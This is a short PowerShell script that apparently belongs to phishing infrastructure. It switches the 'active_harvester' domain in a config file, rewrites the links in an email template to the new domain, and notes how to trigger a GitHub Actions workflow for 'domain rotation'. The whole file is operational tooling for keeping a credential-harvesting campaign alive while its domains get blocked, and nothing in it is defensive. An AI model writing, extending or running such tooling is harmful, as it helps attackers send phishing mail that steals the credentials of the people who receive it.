param(
    [string]$TargetDomain
)

# update_infrastructure.ps1
# Updates config.json and triggers a GitHub Actions workflow for domain rotation

$configPath = "./config.json"

# Update config.json with new active domain
$config = Get-Content $configPath | ConvertFrom-Json
$config.active_harvester = $TargetDomain
$config.status = "rotated"
$config | ConvertTo-Json -Depth 3 | Set-Content $configPath

Write-Host "[+] Updated config.json to use $TargetDomain as active harvester." -ForegroundColor Green

# (Optional) Update BASE_URL in email templates
$emailTemplatePath = "./email_template.txt"
if (Test-Path $emailTemplatePath) {
    (Get-Content $emailTemplatePath) -replace 'https://[\w\.-]+', $TargetDomain | Set-Content $emailTemplatePath
    Write-Host "[+] Updated BASE_URL in email_template.txt." -ForegroundColor Green
}

# (Optional) Trigger a GitHub Actions workflow via repo commit or API call
# Example: git commit -am "Rotate domain to $TargetDomain"; git push
# (Add your repo automation here)
